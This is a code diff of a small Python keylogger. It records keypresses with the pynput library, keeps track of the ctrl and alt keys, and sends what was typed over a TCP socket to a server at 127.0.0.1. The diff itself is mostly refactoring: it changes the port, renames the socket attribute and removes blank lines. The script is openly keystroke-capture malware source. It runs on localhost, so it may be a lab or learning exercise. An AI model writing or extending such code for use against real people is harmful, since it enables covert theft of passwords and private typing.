@@ -1,9 +1,10 @@
 import socket
+import sys
 
 from pynput import keyboard
 
 SERVER_ADDRESS = "127.0.0.1"
-SERVER_PORT = 6000
+SERVER_PORT = 10000
 
 ctrl_state, alt_state = False, False
 
@@ -12,8 +13,6 @@ KEY_MAP = {"enter": "\n", "space": " ", "tab": "\t"}
 
 def on_key_press(key) -> None:
     global ctrl_state, alt_state
-    
-    pressed = ""
     if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
         ctrl_state = True
         return
@@ -35,7 +34,6 @@ def on_key_press(key) -> None:
 
 def on_key_release(key) -> None:
     global ctrl_state, alt_state
-    
     if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
         ctrl_state = False
     elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
@@ -44,16 +42,14 @@ def on_key_release(key) -> None:
 
 class Connection:
     def __init__(self, host: str, port: int) -> None:
-        self._host = host
-        self._port = port
-        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._socket.connect((self._host, self._port))
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.connect((host, port))
 
     def send(self, data: str) -> None:
-        self._socket.send(data.encode())
+        self.sock.send(data.encode())
 
     def close(self) -> None:
-        self._socket.close()
+        self.sock.close()
 
 
 if __name__ == "__main__":
